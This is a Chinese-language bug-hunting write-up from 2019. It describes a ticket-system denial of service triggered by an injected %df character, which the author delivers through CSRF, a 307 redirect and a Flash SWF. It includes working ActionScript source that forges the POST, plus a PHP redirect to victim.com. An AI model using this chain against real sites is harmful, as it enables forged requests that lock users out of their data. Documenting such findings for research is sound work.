---
title: 字符不当处理导致的DOS
tags: 
- CSRF
- Web安全
atthor: Xenc
Date: Oct 27th,2019
grammar_cjkRuby: true
---

> **在一次漏洞挖掘当中遇到的一个有趣的案例这里记录一下**

我在提交工单的地方用burp修改数据包，发送了一个 %df 随后，工单就出错了，无法获取工单列表,进入工单会发现什么也没有，后来发现，就是由于这个字符导致服务器不能正确返回
>  登录账号后可以进行提交工单，提交工单的时候在内容参数上加入 %df等特殊符号会让后端插入数据库造成可逆的影响，提交成功后再次看工单列表的时候会发现工单获取不了，全是0个工单0个在处理，即使在提交一个工单（在上一个工单没有结束前提交工单的话会提示还有一个未解决的工单无法提交新的工单），就算提交成功了，返回提交工单的地方依然是0 获取不了自己的工单，请求工单列表的请求返回的是200 但是无数据，其实是有列表的，但是由于前面插入了非法字符导致数据库造成了一定的影响，在没有删掉那个特殊字符的时候查看工单是没有东西的，间接变成了工单DOS，一个请求，永久无法看见自己的工单，带来了很大的不便

就像这样:

![result_DOS](http://console-log.cn/img/2019_10_27_CSRF_DOS.jpg)

发现这个问题的时候我以为简单构造一个CSRF提交一个 %df字符就可以照成DOS、后来才发现是我太菜了

浏览器会自动把%df进行编码发送过去的时候就变成 %25df 服务器收到了这个并不会出现字符处理不当发送DOS。

漫长利用之路....

随后我才知道，表单提交的时候 **content-type** 被设置成 **application/x-www-form-urlencoded** 会把post参数进行编码然后发送给服务器，编码过程是浏览器自动的无需用户干预。

1. 我尝试POST方式改成GET 结果服务器对方服务器不允许这个方式提交表单

2. 睡了个觉后想起来把 **form** 表单的 **encrypt** 属性改成 **text/plain** 来试试可不可以绕过结果发现 **%df**居然不会被浏览器编码我真是太开心了！！ 后来返回一个错误。。。 我日？？？他不接受这个数据，我的天啊，太难了我。

3. 落泪后我就尝试看一下他接受点啥，才发现只有当 **content-type** 被设置成 **application/x-www-form-urlencoded** 的时候服务器才会接受数据成功提交表单

4. 后面我用AJAX设置头发现也不能超过，会发送OPTIONS预请求，而对方服务器没有开启这个方法，也就失败了

问题来了，使用**content-type** 被设置成 **application/x-www-form-urlencoded** 浏览器自动编码POST数据，该怎么绕过去达到目的呢？？？

太难了。我们必须绕过了它。

最后我想到了 CSRF + 307跳转 + SWF 来达到目的。因为307跳转是一种特殊的跳转，307 状态码可以确保请求方法和消息主体不会发生变化

这就对了，当请求方法和消息主体不会变化的时候就可以成功提交表单

SWF可以设置header头部，然后发送一个 使用**content-type** 被设置成 **application/x-www-form-urlencoded** 的header，通过307跳转去CSRF提交表单。没错我就是这样成功达到了目的。

SWF源代码：
```
package
{
  import flash.display.Sprite;
  import flash.net.URLLoader;
  import flash.net.URLRequest;
  import flash.net.URLRequestHeader;
  import flash.net.URLRequestMethod;
public class csrf extends Sprite
  {
    public function csrf()
    {
      super();
      var member1:Object = null;
      var myJson:String = null;
      member1 = new Object();
      member1 = {
          "acctnum":"100",
          "confirm":"true"
      };
      var myData:Object = member1;
      myJson = JSON.stringify(myData);
      var url:String = "攻击者构造的307跳转界面";
      var request:URLRequest = new URLRequest(url);
      request.requestHeaders.push(new URLRequestHeader("Content-Type","application/x-www-form-urlencoded"));
      request.data = "wd_oid=&ticket_text=11111111111111111111111111111111111111111 %df 'a&ticket_type=2";
      request.method = URLRequestMethod.POST;
      var urlLoader:URLLoader = new URLLoader();
try
      {
          urlLoader.load(request);
          return;
      }
      catch(e:Error)
      {
          trace(e);
          return;
      }
    }
  }
}
```

写一个307跳转：
```
<?php
header("Location: victim.com",true,307);
?>
```

CSRF HTML:

![2019_10_27_CSRF_DOS_CSRFCODE.jpg](http://console-log.cn/img/2019_10_27_CSRF_DOS_CSRFCODE.jpg)

组合上去就可以成功！绕过了阻碍达到了目的。

![2019_10_27_CSRF_DOS_RESULT.jpg](http://console-log.cn/img/2019_10_27_CSRF_DOS_RESULT.jpg)


成功了！

然后我用AJAX + 307跳转 + CSRF也可以进行利用

原理就是利用**307 状态码可以确保请求方法和消息主体不会发生变化** 也不过多阐述。
